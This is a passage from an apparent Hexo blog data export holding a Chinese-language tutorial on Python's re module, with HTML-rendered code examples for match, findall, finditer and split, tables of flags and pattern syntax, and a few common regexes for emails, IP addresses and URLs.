class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt;<span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>pattern = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;\\d+&#x27;</span>)                    <span class=\"comment\"># 用于匹配至少一个数字</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m = pattern.match(<span class=\"string\">&#x27;one12twothree34four&#x27;</span>)        <span class=\"comment\"># 查找头部，没有匹配</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">print</span> m</span><br><span class=\"line\"><span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m = pattern.match(<span class=\"string\">&#x27;one12twothree34four&#x27;</span>, <span class=\"number\">2</span>, <span class=\"number\">10</span>) <span class=\"comment\"># 从&#x27;e&#x27;的位置开始匹配，没有匹配</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">print</span> m</span><br><span class=\"line\"><span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m = pattern.match(<span class=\"string\">&#x27;one12twothree34four&#x27;</span>, <span class=\"number\">3</span>, <span class=\"number\">10</span>) <span class=\"comment\"># 从&#x27;1&#x27;的位置开始匹配，正好匹配</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">print</span> m                                         <span class=\"comment\"># 返回一个 Match 对象</span></span><br><span class=\"line\">&lt;_sre.SRE_Match <span class=\"built_in\">object</span> at <span class=\"number\">0x10a42aac0</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">0</span>)   <span class=\"comment\"># 可省略 0</span></span><br><span class=\"line\"><span class=\"string\">&#x27;12&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.start(<span class=\"number\">0</span>)   <span class=\"comment\"># 可省略 0</span></span><br><span class=\"line\"><span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.end(<span class=\"number\">0</span>)     <span class=\"comment\"># 可省略 0</span></span><br><span class=\"line\"><span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.span(<span class=\"number\">0</span>)    <span class=\"comment\"># 可省略 0</span></span><br><span class=\"line\">(<span class=\"number\">3</span>, <span class=\"number\">5</span>)</span><br></pre></td></tr></table></figure>\n\n<p>在上面，当匹配成功时返回一个 Match 对象，其中：</p>\n<ul>\n<li><code>group([group1, …])</code> 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 <code>group()</code> 或 <code>group(0)</code>；</li>\n<li><code>start([group])</code> 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0；</li>\n<li><code>end([group])</code> 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0；</li>\n<li><code>span([group])</code> 方法返回 <code>(start(group), end(group))</code>。</li>\n</ul>\n<p>再看看一个例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt;<span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>pattern = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;([a-z]+) ([a-z]+)&#x27;</span>, re.I)   <span class=\"comment\"># re.I 表示忽略大小写</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m = pattern.match(<span class=\"string\">&#x27;Hello World Wide Web&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">print</span> m                               <span class=\"comment\"># 匹配成功，返回一个 Match 对象</span></span><br><span class=\"line\">&lt;_sre.SRE_Match <span class=\"built_in\">object</span> at <span class=\"number\">0x10bea83e8</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">0</span>)                            <span class=\"comment\"># 返回匹配成功的整个子串</span></span><br><span class=\"line\"><span class=\"string\">&#x27;Hello World&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.span(<span class=\"number\">0</span>)                             <span class=\"comment\"># 返回匹配成功的整个子串的索引</span></span><br><span class=\"line\">(<span class=\"number\">0</span>, <span class=\"number\">11</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">1</span>)                            <span class=\"comment\"># 返回第一个分组匹配成功的子串</span></span><br><span class=\"line\"><span class=\"string\">&#x27;Hello&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.span(<span class=\"number\">1</span>)                             <span class=\"comment\"># 返回第一个分组匹配成功的子串的索引</span></span><br><span class=\"line\">(<span class=\"number\">0</span>, <span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">2</span>)                            <span class=\"comment\"># 返回第二个分组匹配成功的子串</span></span><br><span class=\"line\"><span class=\"string\">&#x27;World&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.span(<span class=\"number\">2</span>)                             <span class=\"comment\"># 返回第二个分组匹配成功的子串</span></span><br><span class=\"line\">(<span class=\"number\">6</span>, <span class=\"number\">11</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.groups()                            <span class=\"comment\"># 等价于 (m.group(1), m.group(2), ...)</span></span><br><span class=\"line\">(<span class=\"string\">&#x27;Hello&#x27;</span>, <span class=\"string\">&#x27;World&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">3</span>)                            <span class=\"comment\"># 不存在第三个分组</span></span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, line <span class=\"number\">1</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">IndexError: no such group</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"re模块-findall方法\"><a href=\"#re模块-findall方法\" class=\"headerlink\" title=\"re模块-findall方法\"></a>re模块-findall方法</h3><p>在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。</p>\n<p>match 和 search  是匹配一次 findall 匹配所有。</p>\n<p>语法格式为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">findall(string[, pos[, endpos]])</span><br></pre></td></tr></table></figure>\n\n<p>参数：</p>\n<ul>\n<li>string : 待匹配的字符串。</li>\n<li>pos : 可选参数，指定字符串的起始位置，默认为 0。</li>\n<li>endpos : 可选参数，指定字符串的结束位置，默认为字符串的长度。</li>\n</ul>\n<p>查找字符串中的所有数字：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:UTF8 -*-</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\">pattern = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;\\d+&#x27;</span>)   <span class=\"comment\"># 查找数字</span></span><br><span class=\"line\">result1 = pattern.findall(<span class=\"string\">&#x27;runoob 123 google 456&#x27;</span>)</span><br><span class=\"line\">result2 = pattern.findall(<span class=\"string\">&#x27;run88oob123google456&#x27;</span>, <span class=\"number\">0</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"built_in\">print</span>(result1)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result2)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>输出结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[&#x27;123&#x27;, &#x27;456&#x27;]</span><br><span class=\"line\">[&#x27;88&#x27;, &#x27;12&#x27;]</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"re模块-finditer方法\"><a href=\"#re模块-finditer方法\" class=\"headerlink\" title=\"re模块-finditer方法\"></a>re模块-finditer方法</h3><p>和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.finditer(pattern, string, flags=0)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"># -*- coding: UTF-8 -*-</span><br><span class=\"line\"> </span><br><span class=\"line\">import re</span><br><span class=\"line\"> </span><br><span class=\"line\">it = re.finditer(r&quot;\\d+&quot;,&quot;12a32bc43jf3&quot;) </span><br><span class=\"line\">for match in it: </span><br><span class=\"line\">    print (match.group() )</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>输出结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">12 </span><br><span class=\"line\">32 </span><br><span class=\"line\">43 </span><br><span class=\"line\">3</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"re模块-split方法\"><a href=\"#re模块-split方法\" class=\"headerlink\" title=\"re模块-split方法\"></a>re模块-split方法</h3><p>split 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.split(pattern, string[, maxsplit=0, flags=0])</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt;<span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>re.split(<span class=\"string\">&#x27;\\W+&#x27;</span>, <span class=\"string\">&#x27;runoob, runoob, runoob.&#x27;</span>)</span><br><span class=\"line\">[<span class=\"string\">&#x27;runoob&#x27;</span>, <span class=\"string\">&#x27;runoob&#x27;</span>, <span class=\"string\">&#x27;runoob&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>]</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>re.split(<span class=\"string\">&#x27;(\\W+)&#x27;</span>, <span class=\"string\">&#x27; runoob, runoob, runoob.&#x27;</span>) </span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;runoob&#x27;</span>, <span class=\"string\">&#x27;, &#x27;</span>, <span class=\"string\">&#x27;runoob&#x27;</span>, <span class=\"string\">&#x27;, &#x27;</span>, <span class=\"string\">&#x27;runoob&#x27;</span>, <span class=\"string\">&#x27;.&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>]</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>re.split(<span class=\"string\">&#x27;\\W+&#x27;</span>, <span class=\"string\">&#x27; runoob, runoob, runoob.&#x27;</span>, <span class=\"number\">1</span>) </span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;runoob, runoob, runoob.&#x27;</span>]</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>re.split(<span class=\"string\">&#x27;a*&#x27;</span>, <span class=\"string\">&#x27;hello world&#x27;</span>)   <span class=\"comment\"># 对于一个找不到匹配的字符串而言，split 不会对其作出分割</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;hello world&#x27;</span>]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>pattern</td>\n<td>匹配的正则表达式</td>\n</tr>\n<tr>\n<td>string</td>\n<td>要匹配的字符串。</td>\n</tr>\n<tr>\n<td>maxsplit</td>\n<td>分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。</td>\n</tr>\n<tr>\n<td>flags</td>\n<td>标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</td>\n</tr>\n</tbody></table>\n<h2 id=\"正则表达式对象\"><a href=\"#正则表达式对象\" class=\"headerlink\" title=\"正则表达式对象\"></a>正则表达式对象</h2><h3 id=\"re-RegexObject\"><a href=\"#re-RegexObject\" class=\"headerlink\" title=\"re.RegexObject\"></a>re.RegexObject</h3><p>re.compile() 返回 RegexObject 对象。</p>\n<h3 id=\"re-MatchObject\"><a href=\"#re-MatchObject\" class=\"headerlink\" title=\"re.MatchObject\"></a>re.MatchObject</h3><p>group() 返回被 RE 匹配的字符串。</p>\n<ul>\n<li>start() 返回匹配开始的位置</li>\n<li>end() 返回匹配结束的位置</li>\n<li>span() 返回一个元组包含匹配 (开始,结束) 的位置</li>\n</ul>\n<hr>\n<h2 id=\"正则表达式修饰符-可选标志\"><a href=\"#正则表达式修饰符-可选标志\" class=\"headerlink\" title=\"正则表达式修饰符 - 可选标志\"></a>正则表达式修饰符 - 可选标志</h2><p>正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。多个标志可以通过按位 OR(|) 它们来指定。如 re.I | re.M 被设置成 I 和 M 标志：</p>\n<table>\n<thead>\n<tr>\n<th>修饰符</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>re.I</td>\n<td>使匹配对大小写不敏感</td>\n</tr>\n<tr>\n<td>re.L</td>\n<td>做本地化识别（locale-aware）匹配</td>\n</tr>\n<tr>\n<td>re.M</td>\n<td>多行匹配，影响 ^ 和 $</td>\n</tr>\n<tr>\n<td>re.S</td>\n<td>使 . 匹配包括换行在内的所有字符</td>\n</tr>\n<tr>\n<td>re.U</td>\n<td>根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B.</td>\n</tr>\n<tr>\n<td>re.X</td>\n<td>该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"正则表达式模式\"><a href=\"#正则表达式模式\" class=\"headerlink\" title=\"正则表达式模式\"></a>正则表达式模式</h2><p>模式字符串使用特殊的语法来表示一个正则表达式：</p>\n<p>字母和数字表示他们自身。一个正则表达式模式中的字母和数字匹配同样的字符串。</p>\n<p>多数字母和数字前加一个反斜杠时会拥有不同的含义。</p>\n<p>标点符号只有被转义时才匹配自身，否则它们表示特殊的含义。</p>\n<p>反斜杠本身需要使用反斜杠转义。</p>\n<p>由于正则表达式通常都包含反斜杠，所以你最好使用原始字符串来表示它们。模式元素(如 r’\\t’，等价于 ‘\\t’)匹配相应的特殊字符。</p>\n<p>下表列出了正则表达式模式语法中的特殊元素。如果你使用模式的同时提供了可选的标志参数，某些模式元素的含义会改变。</p>\n<table>\n<thead>\n<tr>\n<th>模式</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>^</td>\n<td>匹配字符串的开头</td>\n</tr>\n<tr>\n<td>$</td>\n<td>匹配字符串的末尾。</td>\n</tr>\n<tr>\n<td>.</td>\n<td>匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。</td>\n</tr>\n<tr>\n<td>[…]</td>\n<td>用来表示一组字符,单独列出：[amk] 匹配 ‘a’，’m’或’k’</td>\n</tr>\n<tr>\n<td>[^…]</td>\n<td>不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。</td>\n</tr>\n<tr>\n<td>re*</td>\n<td>匹配0个或多个的表达式。</td>\n</tr>\n<tr>\n<td>re+</td>\n<td>匹配1个或多个的表达式。</td>\n</tr>\n<tr>\n<td>re?</td>\n<td>匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式</td>\n</tr>\n<tr>\n<td>re{ n}</td>\n<td>精确匹配 n 个前面表达式。例如， o{2} 不能匹配 “Bob” 中的 “o”，但是能匹配 “food” 中的两个 o。</td>\n</tr>\n<tr>\n<td>re{ n,}</td>\n<td>匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于 “o+”。”o{0,}” 则等价于 “o*”。</td>\n</tr>\n<tr>\n<td>re{ n, m}</td>\n<td>匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式</td>\n</tr>\n<tr>\n<td>a| b</td>\n<td>匹配a或b</td>\n</tr>\n<tr>\n<td>(re)</td>\n<td>对正则表达式分组并记住匹配的文本</td>\n</tr>\n<tr>\n<td>(?imx)</td>\n<td>正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。</td>\n</tr>\n<tr>\n<td>(?-imx)</td>\n<td>正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。</td>\n</tr>\n<tr>\n<td>(?: re)</td>\n<td>类似 (…), 但是不表示一个组</td>\n</tr>\n<tr>\n<td>(?imx: re)</td>\n<td>在括号中使用i, m, 或 x 可选标志</td>\n</tr>\n<tr>\n<td>(?-imx: re)</td>\n<td>在括号中不使用i, m, 或 x 可选标志</td>\n</tr>\n<tr>\n<td>(?#…)</td>\n<td>注释.</td>\n</tr>\n<tr>\n<td>(?= re)</td>\n<td>前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。</td>\n</tr>\n<tr>\n<td>(?! re)</td>\n<td>前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功</td>\n</tr>\n<tr>\n<td>(?&gt; re)</td>\n<td>匹配的独立模式，省去回溯。</td>\n</tr>\n<tr>\n<td>\\w</td>\n<td>匹配字母数字及下划线</td>\n</tr>\n<tr>\n<td>\\W</td>\n<td>匹配非字母数字及下划线</td>\n</tr>\n<tr>\n<td>\\s</td>\n<td>匹配任意空白字符，等价于 [ \\t\\n\\r\\f]。</td>\n</tr>\n<tr>\n<td>\\S</td>\n<td>匹配任意非空字符</td>\n</tr>\n<tr>\n<td>\\d</td>\n<td>匹配任意数字，等价于 [0-9].</td>\n</tr>\n<tr>\n<td>\\D</td>\n<td>匹配任意非数字</td>\n</tr>\n<tr>\n<td>\\A</td>\n<td>匹配字符串开始</td>\n</tr>\n<tr>\n<td>\\Z</td>\n<td>匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。</td>\n</tr>\n<tr>\n<td>\\z</td>\n<td>匹配字符串结束</td>\n</tr>\n<tr>\n<td>\\G</td>\n<td>匹配最后匹配完成的位置。</td>\n</tr>\n<tr>\n<td>\\b</td>\n<td>匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。</td>\n</tr>\n<tr>\n<td>\\B</td>\n<td>匹配非单词边界。’er\\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。</td>\n</tr>\n<tr>\n<td>\\n, \\t, 等.</td>\n<td>匹配一个换行符。匹配一个制表符。等</td>\n</tr>\n<tr>\n<td>\\1…\\9</td>\n<td>匹配第n个分组的内容。</td>\n</tr>\n<tr>\n<td>\\10</td>\n<td>匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"正则表达式实例\"><a href=\"#正则表达式实例\" class=\"headerlink\" title=\"正则表达式实例\"></a>正则表达式实例</h2><h4 id=\"字符匹配\"><a href=\"#字符匹配\" class=\"headerlink\" title=\"字符匹配\"></a>字符匹配</h4><table>\n<thead>\n<tr>\n<th>实例</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>python</td>\n<td>匹配 “python”.</td>\n</tr>\n</tbody></table>\n<h4 id=\"字符类\"><a href=\"#字符类\" class=\"headerlink\" title=\"字符类\"></a>字符类</h4><table>\n<thead>\n<tr>\n<th>实例</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>[Pp]ython</td>\n<td>匹配 “Python” 或 “python”</td>\n</tr>\n<tr>\n<td>rub[ye]</td>\n<td>匹配 “ruby” 或 “rube”</td>\n</tr>\n<tr>\n<td>[aeiou]</td>\n<td>匹配中括号内的任意一个字母</td>\n</tr>\n<tr>\n<td>[0-9]</td>\n<td>匹配任何数字。类似于 [0123456789]</td>\n</tr>\n<tr>\n<td>[a-z]</td>\n<td>匹配任何小写字母</td>\n</tr>\n<tr>\n<td>[A-Z]</td>\n<td>匹配任何大写字母</td>\n</tr>\n<tr>\n<td>[a-zA-Z0-9]</td>\n<td>匹配任何字母及数字</td>\n</tr>\n<tr>\n<td>[^aeiou]</td>\n<td>除了aeiou字母以外的所有字符</td>\n</tr>\n<tr>\n<td>[^0-9]</td>\n<td>匹配除了数字外的字符</td>\n</tr>\n</tbody></table>\n<h4 id=\"特殊字符类\"><a href=\"#特殊字符类\" class=\"headerlink\" title=\"特殊字符类\"></a>特殊字符类</h4><table>\n<thead>\n<tr>\n<th>实例</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>.</td>\n<td>匹配除 “\\n” 之外的任何单个字符。要匹配包括 ‘\\n’ 在内的任何字符，请使用象 ‘[.\\n]’ 的模式。</td>\n</tr>\n<tr>\n<td>\\d</td>\n<td>匹配一个数字字符。等价于 [0-9]。</td>\n</tr>\n<tr>\n<td>\\D</td>\n<td>匹配一个非数字字符。等价于 [^0-9]。</td>\n</tr>\n<tr>\n<td>\\s</td>\n<td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \\f\\n\\r\\t\\v]。</td>\n</tr>\n<tr>\n<td>\\S</td>\n<td>匹配任何非空白字符。等价于 [^ \\f\\n\\r\\t\\v]。</td>\n</tr>\n<tr>\n<td>\\w</td>\n<td>匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。</td>\n</tr>\n<tr>\n<td>\\W</td>\n<td>匹配任何非单词字符。等价于 ‘[^A-Za-z0-9_]’。</td>\n</tr>\n</tbody></table>\n<p>w(ﾟДﾟ)w！！！！！！！！</p>\n<p>常用正则表达式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Email: &#x27;[0-9a-zA-Z]+@[0-9a-zA-Z]+\\.[a-zA-Z]&#123;2,3&#125;&#x27;</span><br><span class=\"line\">Ip地址: (ipv4)：&#x27;\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;&#x27;</span><br><span class=\"line\">Web地址: &#x27;https?:/&#123;2&#125;\\w.+&#x27;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h2><h3 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">方法、属性、迭代器、生成器、异常、类和对象、函数、字典、列表、元组、字符串、条件循环等其他语句；</span><br></pre></td></tr></table></figure>\n\n<p>开始进阶@O(∩_∩)O@</p>\n<h3 id=\"正则表达式-元字符\"><a href=\"#正则表达式-元字符\" class=\"headerlink\" title=\"正则表达式-元字符\"></a>正则表达式-元字符</h3><p><img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210623212648037.png\" alt=\"image-20210623212648037\"></p>\n<h3 id=\"正则表达式-重复\"><a href=\"#正则表达式-重复\" class=\"headerlink\" title=\"正则表达式-重复\"></a>正则表达式-重复</h3><p><img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210623213058621.png\" alt=\"image-20210623213058621\"></p>\n<h3 id=\"正则表达式-反义\"><a href=\"#正则表达式-反义\" class=\"headerlink\" title=\"正则表达式-反义\"></a>正则表达式-反义</h3><p><img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210623214030452.png\" alt=\"image-20210623214030452\"></p>\n<h3 id=\"re模块-match方法\"><a href=\"#re模块-match方法\" class=\"headerlink\" title=\"re模块-match方法\"></a>re模块-match方法</h3><p>re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.match(pattern, string, flags=<span class=\"number\">0</span>)   <span class=\"comment\">#函数语法</span></span><br></pre></td></tr></table></figure>\n\n<p>函数参数说明：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">pattern</td>\n<td align=\"center\">匹配的正则表达式</td>\n</tr>\n<tr>\n<td align=\"center\">string</td>\n<td align=\"center\">要匹配的字符串</td>\n</tr>\n<tr>\n<td align=\"center\">flags</td>\n<td align=\"center\">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</td>\n</tr>\n</tbody></table>\n<p>匹配成功re.match方法返回一个匹配的对象，否则返回None。</p>\n<p>我们可以使用group(num) 或  groups() 匹配对象函数来获取匹配表达式。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">匹配对象方法</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">group(num=0)</td>\n<td align=\"center\">匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组</td>\n</tr>\n<tr>\n<td align=\"center\">groups()</td>\n<td align=\"center\">返回一个包含所有小组字符串的元组，从 1 到 所含的小组号</td>\n</tr>\n</tbody></table>\n<p>实例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*- </span></span><br><span class=\"line\"> <span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"built_in\">print</span>(re.match(<span class=\"string\">&#x27;www&#x27;</span>, <span class=\"string\">&#x27;www.fbc123.com&#x27;</span>).span())  <span class=\"comment\"># 在起始位置匹配</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(re.match(<span class=\"string\">&#x27;com&#x27;</span>, <span class=\"string\">&#x27;www.fbc123.com&#x27;</span>))         <span class=\"comment\"># 